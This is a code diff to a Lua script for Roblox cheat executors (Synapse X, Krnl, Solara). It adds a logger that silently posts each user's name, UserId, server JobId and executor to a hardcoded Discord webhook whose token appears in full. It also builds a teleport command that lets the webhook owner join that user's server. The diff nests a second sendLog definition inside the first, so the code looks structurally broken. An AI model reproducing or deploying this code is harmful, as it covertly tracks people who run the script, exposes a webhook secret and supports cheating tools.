@@ -102,7 +102,44 @@ local function sendLog()
         end
     end)
 
-    -- Mensaje para Discord con enlace
+--===[[ LOGGER - Registra quién carga el script con JobId (Embed) ]]===--
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- 🔥 Webhook de Discord
+local LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1539952686919852163/L3RzuEl4erOgADALR4UMc1meHMFnE6EsWH8bsmxCkoWrR_LD4Mi2UunN2Yuj3fk0p1UK"
+
+-- Variable para evitar duplicados
+local logged = false
+
+local function sendLog()
+    if logged then return end
+    logged = true
+
+    local playerName = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    local userId = LocalPlayer.UserId
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local serverTime = os.time()
+    local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)
+
+    -- Información del ejecutor
+    local executor = "Desconocido"
+    pcall(function()
+        if syn and syn.version then
+            executor = "Synapse X - " .. syn.version
+        elseif krnl and krnl.version then
+            executor = "Krnl - " .. krnl.version
+        elseif script and script.Name and script.Name == "Solara" then
+            executor = "Solara"
+        else
+            executor = "Otro ejecutor"
+        end
+    end)
+
+    -- 📊 MENSAJE CON EMBED
     local data = {
         ["content"] = "📊 **¡Alguien cargó el script!**",
         ["embeds"] = {{
@@ -130,8 +167,13 @@ local function sendLog()
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🔗 Enlace para unirse",
-                    ["value"] = "[Haz clic aquí para unirte al servidor](" .. serverLink .. ")",
+                    ["name"] = "🔑 JobId (copia esto)",
+                    ["value"] = "`" .. jobId .. "`",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📌 Comando para unirte",
+                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```",
                     ["inline"] = false
                 }
             },
